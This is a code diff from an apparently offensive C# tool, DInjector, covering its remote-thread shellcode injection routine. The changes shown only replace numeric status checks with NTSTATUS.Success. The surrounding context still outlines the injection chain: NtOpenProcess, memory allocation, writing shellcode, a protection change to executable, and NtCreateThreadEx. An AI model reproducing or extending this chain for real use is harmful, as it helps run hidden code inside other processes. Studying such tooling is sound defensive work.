@@ -2,6 +2,7 @@
 using System.Runtime.InteropServices;
 
 using DI = DInvoke;
+using static DInvoke.Data.Native;
 
 namespace DInjector
 {
@@ -21,7 +22,7 @@ namespace DInjector
                 ref oa,
                 ref ci);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThread) [+] NtOpenProcess");
             else
                 Console.WriteLine($"(RemoteThread) [-] NtOpenProcess: {ntstatus}");
@@ -41,7 +42,7 @@ namespace DInjector
                 DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
             else
                 Console.WriteLine($"(RemoteThread) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
@@ -62,7 +63,7 @@ namespace DInjector
                 (uint)shellcode.Length,
                 ref bytesWritten);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThread) [+] NtWriteVirtualMemory");
             else
                 Console.WriteLine($"(RemoteThread) [-] NtWriteVirtualMemory: {ntstatus}");
@@ -82,7 +83,7 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                 ref oldProtect);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
             else
                 Console.WriteLine($"(RemoteThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
@@ -106,7 +107,7 @@ namespace DInjector
                 0,
                 IntPtr.Zero);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThread) [+] NtCreateThreadEx");
             else
                 Console.WriteLine($"(RemoteThread) [-] NtCreateThreadEx: {ntstatus}");
